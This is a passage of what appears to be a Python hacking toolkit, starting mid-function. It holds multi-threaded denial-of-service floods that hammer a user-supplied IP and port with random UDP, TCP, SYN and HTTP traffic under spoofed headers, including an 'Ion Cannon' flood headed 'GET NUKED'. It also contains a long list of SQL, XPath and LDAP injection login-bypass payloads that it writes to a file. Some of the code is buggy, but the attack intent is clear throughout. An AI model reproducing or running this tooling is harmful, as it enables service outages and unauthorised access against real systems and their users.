                n5 = random.choice(ang)
                n6 = random.choice(ang)
                n7 = random.choice(ang)
                fip = f"1{n1}{n2}.{n3}{n4}{n5}.{n6}.{n7}"
                for fk in fake:
                    try:
                        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        tls = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        byte = random._urandom(65000)
                        tip = tuple(ip)
                        udp.sendto(byte, (ip,port))
                        http.connect((ip,port))
                        msg = {
                            "GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\n"
                            "User-Agent: "+random.choice(ua)+"\r\n"
                            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
                            "Connection: Keep-Alive\r\n\r\n"
                        }
                        tls.connect((ip,port))
                        tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
                        scraper = cloudscraper.CloudScraper(disableCloudflareV1=True)
                        scraper = cloudscraper.create_scraper(browser='chrome')
                        t = str(ip)
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        req = "GET / "+ip+" HTTP/1.1\r\n"
                        req += "Host: "+random.choice(fake)+"\r\n"
                        req += "Proxy-agent: "+str(fip)+"/1.0\r\n"
                        req += "User-Agent: "+random.choice(ua)+"\r\n"
                        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
                        req += "Connection: Keep-Alive\r\n"
                        s.send((req).encode('utf-8'))
                        s.sendto(byte,(ip,port))
                        s.close
                        chosen_fake = random.choice(fake)
                        conn = http.client.HTTPConnection(chosen_fake)
                        conn.request("GET", "/" + ip, headers={"Host": chosen_fake})
                        attack += 1
                        packet = IP(dst=ip) / TCP(dport=port, sport=0x8888, flags="S")
                        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
                        result, _ = srp(arp_request, timeout=0, verbose=0)
                        response = sr1(packet, timeout=0, verbose=0)
                        for i in range(bps):
                            udp.sendto(byte, (ip,port))
                            udp.sendto(byte,("GET "+t+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
                            http.sendto(byte, (ip,port))
                            tls.sendto(byte,("GET "+t+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
                            pack = "SYN\x00"
                            pack_len = len(pack)
                            tcp_syn_packet = pack + struct.pack("!i", ip, port) + struct.pack("!i", ip, port)
                            tcp_syn_packet = tcp_syn_packet + ' \x80\x00\x00\x00 '
                            tcp_syn_packet = tcp_syn_packet + ' \x00\x00\x00\x80 '
                            # Add TCP/IP header
                            tcp_packet = tcp_syn_packet + struct.pack('!'+'i', tcp_syn_packet.nbytes)
                            tcp.send(tcp_packet, (ip,port))
                            scraper.get(ip, timeout=thrd)
                    except TimeoutError:
                        count += 1
                        print(Fore.LIGHTRED_EX+'TARGET IS DOWN : ERR.CONNECTION.TIMEOUT                             ', end='\r')
                    except TypeError:
                        continue
                    except OSError:
                        continue
                    except socket.gaierror:
                        continue
                    except:
                        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        tls = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        byte = random._urandom(65000)
                        udp.sendto(byte, (ip,port))
                        http.connect((ip,port))
                        msg = {
                            "GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\n"
                            "User-Agent: "+random.choice(ua)+"\r\n"
                            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
                            "Connection: Keep-Alive\r\n\r\n"
                        } 
                        tls.connect((ip,port))
                        tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
                        scraper = cloudscraper.CloudScraper(disableCloudflareV1=True)
                        scraper = cloudscraper.create_scraper(browser='chrome')
                        t = str(ip)
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        req = "GET / "+ip+" HTTP/1.1\r\n"
                        req += "Host: "+random.choice(fake)+"\r\n"
                        req += "Proxy-agent: "+str(fip)+"/1.0\r\n"
                        req += "User-Agent: "+random.choice(ua)+"\r\n"
                        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
                        req += "Connection: Keep-Alive\r\n"
                        s.send((req).encode('utf-8'))
                        s.sendto(byte,(ip,port))
                        s.close
                        chosen_fake = random.choice(fake)
                        conn = http.client.HTTPConnection(chosen_fake)
                        conn.request("GET", "/" + ip, headers={"Host": chosen_fake})
                        attack += 1
                        packet = IP(dst=ip) / TCP(dport=port, sport=0x8888, flags="S")
                        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
                        result, _ = srp(arp_request, timeout=0, verbose=0)
                        response = sr1(packet, timeout=0, verbose=0)
                        print(f"ATTACKING SERVER {ip}:{port} Sent :", attack, end='\r')
                        for i in range(bps):
                            udp.sendto(byte, (ip,port))
                            udp.sendto(byte,("GET "+t+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
                            http.sendto(byte, (ip,port))
                            tls.sendto(byte,("GET "+t+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
                            pack = "SYN\x00"
                            pack_len = len(pack)
                            tcp_syn_packet = pack + struct.pack("!i", ip, port) + struct.pack("!i", ip, port)
                            tcp_syn_packet = tcp_syn_packet + ' \x80\x00\x00\x00 '
                            tcp_syn_packet = tcp_syn_packet + ' \x00\x00\x00\x80 '
                            # Add TCP/IP header
                            tcp_packet = tcp_syn_packet + struct.pack('!'+'i', tcp_syn_packet.nbytes)
                            tcp.send(tcp_packet, (ip,port))
                            scraper.get(ip, timeout=thrd)
            for i in range(thrd):
                tea = threading.Thread(target=c2_special)
                tea.start()
        except ModuleNotFoundError:
            print("Did you install the requirements.txt?")
        except ValueError:
            print("Did you fill the target info correctly? Retry please!")
        except EOFError:
            print("Exit..")
            exit()
    elif answer == '17':
        pass
        print("BXB Method Maker")
        jso = input(f"Your JSO Script : ")
        loges = input(f"Save AS [example : BXB1 ] : ")
        print("wait..")
        N = "#BXB 2"
        N += ""
        N += "or '=' --+ 'or limit 1=1 1-- -+ or 1=1- ' /* admin' or '1'='1 admin' 'or 1=1 == True or Pass --+ admin' ''='"
        N += "or"
        N += """'or '='--+'("1"="1"# )--+'or 1=1 limit 1-- -+ '') SELECT id, username, password, left(password, 8)-- -+ or (("x"))=(("x or 1=1 or 1=1-- or 1=1# or 1=1/* admin' -- admin'/*"""
        N += ""
        N += "#BXB 3"
        N += f"""' or 1=1 limit 1-- -+ 'or 1=1 limit 1 -- -+ 'or 1=1 limit 1 - -+ SELECT id, username, left(password, 8) AS snipped_password, email FROM accounts WHERE username='admin' AND`` `` password=password=1; 'order by 1--  - 'union select 1,2-- - admin' # admin' or '1'='1 admin' or '1'='1'# admin' or 1=1 or ''=' 'or 1=1 limits 1 -- -+ ' or '1'='1 ' or 'x'='x ' or 0=0 -- ' or 0=0 # 1=0 UNION ALL SELECT admin password 1234 123456 root toor test guest ' or '1'='1 ' or ''=' ' or 1]%00 ' or /* or ' ' or "a" or ' ' or 1 or ' ' or true() or ' 'or string-length(name(.))<10 or' 'or contains(name,'adm') or' 'or contains(.,'adm') or' 'or position()=2 or' admin' or ' admin' or '1'='2 * *)(& *)(|(& pwd) *)(|(* *))%00 admin)(&) pwd admin)(!(&(| pwd)) admin))(|(| 1234 '-' ' ' '&' '^' '*' ' or ''-' ' or '' ' ' or ''&' ' or ''^' ' or ''*' "-" " " "&" "^" "*" " or ""-" " or "" " " or ""&" " or ""^" " or ""*" or true-- " or true-- ' or true-- ") or true-- ') or true-- ' or 'x'='x ') or ('x')=('x ')) or (('x'))=(('x " or "x"="x ") or ("x")=("x ")) or (("x"))=(("x or 1=1 or 1=1-- or 1=1# or 1=1/* admin' -- admin' # admin'/* admin' or '1'='1 admin' or '1'='1'-- admin' or '1'='1'# admin' or '1'='1'/* admin'or 1=1 or ''=' admin' or 1=1 admin' or 1=1-- admin' or 1=1# admin' or 1=1/* admin') or ('1'='1 admin') or ('1'='1'-- admin') or ('1'='1'# admin') or ('1'='1'/* admin') or '1'='1 admin') or '1'='1'-- admin') or '1'='1'# admin') or '1'='1'/* 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055 1234 ' AND 1=0 UNION ALL SELECT 'admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220 admin" -- admin" # admin"/* admin" or "1"="1 admin" or "1"="1"-- admin" or "1"="1"# admin" or "1"="1"/* admin"or 1=1 or ""=" admin" or 1=1 admin" or 1=1-- admin" or 1=1# admin" or 1=1/* admin") or ("1"="1 admin") or ("1"="1"-- admin") or ("1"="1"# admin") or ("1"="1"/* admin") or "1"="1 admin") or "1"="1"-- admin") or "1"="1"# admin") or "1"="1"/* 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 1234 " AND 1=0 UNION ALL SELECT "admin", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220 == "> ") " ') {jso} <" = "> ") " ') '{jso} <" ' ' -- ' # ' – '-- '/* '# " -- " # "/* ' and 1='1 ' and a='a or true ' or ''=' " or ""=" 1′) and '1′='1– ' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055 " AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055 ' AND 1=0 UNION ALL SELECT '', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220 " AND 1=0 UNION ALL SELECT "", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220 and 1=1 and 1=1– ' and 'one'='one ' and 'one'='one– ' group by password having 1=1-- ' group by userid having 1=1-- ' group by username having 1=1-- like '%' or 0=0 -- or 0=0 # or 0=0 – ' or         0=0 # ' or 0=0 -- ' or 0=0 # ' or 0=0 – " or 0=0 -- " or 0=0 # " or 0=0 – %' or '0'='0 or 1=1– ' or 1=1-- ' or '1'='1 ' or '1'='1'-- ' or '1'='1'/* ' or '1'='1'# ' or '1′='1 ' or 1=1 ' or 1=1 -- ' or 1=1 – ' or 1=1;# ' or 1=1/* ' or 1=1# ' or 1=1– ') or '1'='1 ') or '1'='1-- ') or '1'='1'-- ') or '1'='1'/* ') or '1'='1'# ') or ('1'='1 ') or ('1'='1-- ') or ('1'='1'-- ') or ('1'='1'/* ') or ('1'='1'# 'or'1=1 'or'1=1′ " or "1"="1 " or "1"="1"-- " or "1"="1"/* " or "1"="1"# " or 1=1 " or 1=1 -- " or 1=1 – " or 1=1-- " or 1=1/* " or 1=1# " or 1=1– ") or "1"="1 ") or "1"="1"-- ") or "1"="1"/* ") or "1"="1"# ") or ("1"="1 ") or ("1"="1"-- ") or ("1"="1"/* ") or ("1"="1"# ) or '1′='1– ) or ('1′='1– ' or 1=1 LIMIT 1;# 'or 1=1 or ''=' "or 1=1 or ""=" ' or a=a-- ' or a=a– " or "a"="a ") or ("a"="a ') or ('a'='a and hi") or ("a"="a ' or 'one'='one ' or 'one'='one– ' or uid like '% ' or uname like '% ' or userid like '% ' or user like '% ' or username like '% ') or ('x'='x ' OR 'x'='x'#; '=' 'or' and '=' 'or' ' UNION ALL SELECT 1, @@version;# ' UNION ALL SELECT system_user(),user();# ' UNION select table_schema,table_name FROM information_Schema.tables;# admin' and substring(password/text(),1,1)='7 ' and substring(password/text(),1,1)='7 ' or 1=1-- ' or 'one'='one 'or 1=1-- - 1'or'1'='1 'or''='"""

        def logger(N):
                file = open((loges) + ".txt", "a")
                file.write(str(N))
                file.write("\n")
                file.close()
        logger(N)
        print(f"Success, Check it on {loges}.txt")
    elif answer == '18':
        pass
        if os.name == 'posix':
            os.system('clear')
        elif os.name == 'nt':
            os.system('cls')
        ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
                   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
        logo = """
                    777955057                     
                 7080888080888907                 
               78880099999690880887               
             508009999494949999968084             
            808694949494949494949466801           
            080699994949494949499996085           
            18888806666969666666008088            
               4068808080888088800177             
                   17   177  77                   
                        440                       
                        808                       
                 78861775557716807                
                     7 74147 7                    
                       70807                      
                       22560                      
                      74177777                    
                 18088808080808577                
                4880695555545998084               
                
                WH00PZ ! GET NUKED!
        """
        print(logo)
        ip = str(input("IP TARGET : "))
        port = int(input("PORT : "))
        thrd = int(input("THREAD : "))
        if os.name == 'posix':
            os.system('clear')
        elif os.name == 'nt':
            os.system('cls')
        print(logo)
        def flood():
            try:
                ang = ['1','2','3','4','5','6','7','8','9','0']
                n1 = random.choice(ang)
                n2 = random.choice(ang)
                n3 = random.choice(ang)
                n4 = random.choice(ang)
                n5 = random.choice(ang)
                n6 = random.choice(ang)
                n7 = random.choice(ang)
                n8 = random.choice(ang)
                n9 = random.choice(ang)
                n10 = random.choice(ang)
                n11 = random.choice(ang)
                fip = f"1{n1}{n2}.{n3}{n4}{n5}.{n6}.{n7}:{n8}{n9}{n10}{n11}"
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip,port))
                s.sendto(("GET /" + ip + " HTTP/1.1\r\n\r\n").encode('ascii'), (ip,port))
                s.sendto(("Host: " + str(fip) + "\r\n\r\n").encode('ascii'), (ip,port))
                req = "GET " + str(ip) + " HTTP/1.1\r\n"
                req += "Host: " + str(fip) + "\r\n"
                req += "Proxt-agent: " + str(fip) + "\r\n"
                req += "User-Agent: " + random.choice(ua) + "\r\n"
                req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
                req += "Connection: keep-alive\r\n"
                req2 = "GET / HTTP/2.0\r\n"
                req2 += "Cache-Control: max-age=0\r\n"
                req2 += 'Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"\r\n'
                req2 += "Sec-Ch-Ua-Mobile: ?0\r\n"
                req2 += 'Sec-Ch-Ua-Platform: "Windows"\r\n'
                req2 += "Dnt: 1\r\n"
                req2 += "Upgrade-Insecure-Requests: 1\r\n"
                req2 += "User-Agent: "+random.choice(ua)+"\r\n"
                req2 += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
                req2 += "Sec-Fetch-Site: none"
                req2 += "Sec-Fetch-Mode: navigate"
                req2 += "Sec-Fetch-User: ?1"
                req2 += "Sec-Fetch-Dest: document"
                req2 += "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                req2 += "Accept-Encoding: gzip, deflate, br"
                req2 += "Host: "+ip+""
                req2 += "X-HTTPS: 1"
                req2 += "Content-Length: 0"
                req2 += "Host: " + str(fip) + "\r\n"
                req2 += "Proxt-agent: " + str(fip) + "\r\n"
                s.sendto((req).encode('ascii'), (ip,port))
                s.sendto((req2).encode('ascii'), (ip,port))
                s.close()
                print(f"{yellow}Ion Cannon Loaded : {red}", i, f"{yellow}%", end='\r')
            except ConnectionResetError:
                print("Connection Reset", end='\r')
            except TimeoutError:
                print("Request Timeout", end='\r')
        for i in range(thrd):
            t = threading.Thread(target=flood)
            t.start()
    else:
        print(green + f"Exit..")
        exit()
else:
    print(green + f"Exit")
    exit()
